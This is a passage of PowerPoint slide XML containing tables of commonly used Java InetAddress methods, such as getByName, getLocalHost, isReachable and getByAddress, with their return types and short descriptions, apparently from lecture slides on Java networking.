                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Commonly Used Methods</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="6" name="Table 5"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="304799" y="838200"/>
          <a:ext cx="11734801" cy="5669388"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="838201"/>
                <a:gridCol w="2546838"/>
                <a:gridCol w="2708030"/>
                <a:gridCol w="5641732"/>
              </a:tblGrid>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l"/>
                      <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="404040"/>
                        </a:solidFill>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400" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Return Type</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="404040"/>
                        </a:solidFill>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400" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Method</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="404040"/>
                        </a:solidFill>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400" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Description</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="404040"/>
                        </a:solidFill>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US" sz="2400" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>1</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effectLst/>
                        </a:rPr>
                        <a:t>static </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>InetAddress</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err="1">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>getByName</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t> (String host)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2400" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="FF0000"/>
                        </a:solidFill>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effectLst/>
                        </a:rPr>
                        <a:t>Returns InetAddress for a host (IP or domain).</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="24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US" sz="2400" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>2</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effectLst/>
                        </a:rPr>
                        <a:t>static </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>InetAddress</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>[]</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err="1">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>getAllByName</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t> (String host)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2400" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="FF0000"/>
                        </a:solidFill>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effectLst/>
                        </a:rPr>
                        <a:t>Returns all IPs for a host (if multiple exist).</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="24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US" sz="2400" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>3</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effectLst/>
                        </a:rPr>
                        <a:t>static </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>InetAddress</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err="1">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>getLocalHost</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>()</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2400" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="FF0000"/>
                        </a:solidFill>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effectLst/>
                        </a:rPr>
                        <a:t>Returns the local machine's IP.</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2400" dirty="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US" sz="2400" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>4</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effectLst/>
                        </a:rPr>
                        <a:t>String</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effectLst/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>getHostName</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>()</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effectLst/>
                        </a:rPr>
                        <a:t>Returns the hostname (performs reverse DNS if needed).</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2400" dirty="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US" sz="2400" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>5</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effectLst/>
                        </a:rPr>
                        <a:t>String</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err="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>getHostAddress</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>()</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effectLst/>
                        </a:rPr>
                        <a:t>Returns the IP as a string (e.g., "192.168.1.1").</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="24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US" sz="2400" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>6</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err="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>boolean</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2400" dirty="0">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err="1">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>isReachable</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>(int timeout)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2400" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="00B050"/>
                        </a:solidFill>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effectLst/>
                        </a:rPr>
                        <a:t>Checks if the host is reachable (ICMP ping).</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2400" dirty="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graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="5" name="Table 4"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="228600" y="136525"/>
          <a:ext cx="11387668" cy="3541864"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" firstCol="1" bandRow="1"/>
              <a:tblGrid>
                <a:gridCol w="436034"/>
                <a:gridCol w="1981200"/>
                <a:gridCol w="2209800"/>
                <a:gridCol w="6760634"/>
              </a:tblGrid>
              <a:tr h="377127">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="ctr"/>
                      <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="404040"/>
                        </a:solidFill>
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marR="130645" marT="65322" marB="6532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en-US" sz="2400" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Return Type</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="404040"/>
                        </a:solidFill>
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marR="130645" marT="65322" marB="6532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400" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Method</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="404040"/>
                        </a:solidFill>
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marR="130645" marT="65322" marB="6532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en-US" sz="2400" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Description</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="404040"/>
                        </a:solidFill>
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="130645" marR="130645" marT="65322" marB="6532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127">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" marR="0" algn="ctr" defTabSz="914400" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
                        <a:lnSpc>
                          <a:spcPct val="107000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>7</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="404040"/>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defTabSz="914400" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
                        <a:lnSpc>
                          <a:spcPct val="107000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>byte[]</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="404040"/>
                        </a:solidFill>
                        <a:effectLst/>
                        <a:latin typeface="+mn-lt"/>
                        <a:ea typeface="+mn-ea"/>
                        <a:cs typeface="+mn-cs"/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:pPr marL="0" marR="0" algn="l" defTabSz="914400" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
                        <a:lnSpc>
                          <a:spcPct val="107000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="404040"/>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defTabSz="914400" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
                        <a:lnSpc>
                          <a:spcPct val="107000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>getAddress</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>()</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="404040"/>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defTabSz="914400" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
                        <a:lnSpc>
                          <a:spcPct val="107000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>Returns the raw IP address of this </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>InetAddress</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t> object.</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="404040"/>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defTabSz="914400" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
                        <a:lnSpc>
                          <a:spcPct val="107000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>8</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="404040"/>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defTabSz="914400" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
                        <a:lnSpc>
                          <a:spcPct val="107000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>static </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>InetAddress</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>[]</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="404040"/>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defTabSz="914400" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
                        <a:lnSpc>
                          <a:spcPct val="107000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>getByAddress</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t> (byte[] </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>addr</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="FF0000"/>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defTabSz="914400" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
                        <a:lnSpc>
                          <a:spcPct val="107000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" b="0" kern="1200">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>Returns an InetAddress object given the raw IP address</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2400" b="0" kern="1200">
                        <a:solidFill>
                          <a:srgbClr val="404040"/>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defTabSz="914400" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
                        <a:lnSpc>
                          <a:spcPct val="107000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>9</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="404040"/>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defTabSz="914400" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
                        <a:lnSpc>
                          <a:spcPct val="107000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>static </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>InetAddress</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>[]</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="404040"/>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defTabSz="914400" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
                        <a:lnSpc>
                          <a:spcPct val="107000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>getByAddress</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t> (String host, byte </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>addr</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>[])</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="FF0000"/>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defTabSz="914400" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
                        <a:lnSpc>
                          <a:spcPct val="107000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>Create an </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>lnetAddress</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t> based on the provided host name and </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>IPaddress</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>, No name service is checked for the validity of the address.</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="404040"/>
                        </a:solidFill>
                        <a:effectLst/>
                        <a:latin typeface="+mn-lt"/>
                        <a:ea typeface="+mn-ea"/>
                        <a:cs typeface="+mn-cs"/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:pPr marL="0" marR="0" algn="l" defTabSz="914400" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
                        <a:lnSpc>
                          <a:spcPct val="107000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                      </a:pPr>
                      <a:r>
